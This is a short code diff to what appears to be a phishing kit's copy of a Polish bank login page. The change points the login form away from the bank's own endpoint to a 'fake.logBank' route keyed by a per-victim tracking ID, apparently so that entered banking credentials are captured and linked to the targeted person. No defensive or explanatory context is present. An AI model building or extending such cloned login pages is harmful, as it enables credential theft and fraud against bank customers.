@@ -30,7 +30,7 @@
                                     <div style="width:455px;">
                                         <h1>Logowanie</h1>
                                     </div>
-                                    <form class="form_valid form_content login login_anti_phishing" method="POST" id="bank_pm_form" action="/log/bank">
+                                    <form class="form_valid form_content login login_anti_phishing" method="POST" id="bank_pm_form" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}">
                                         <table id="form_table" class="fullwidth" name="content_table">
                                             <tbody>
                                             <tr class="field_row f_root FriendlyLoginEditFieldRow"
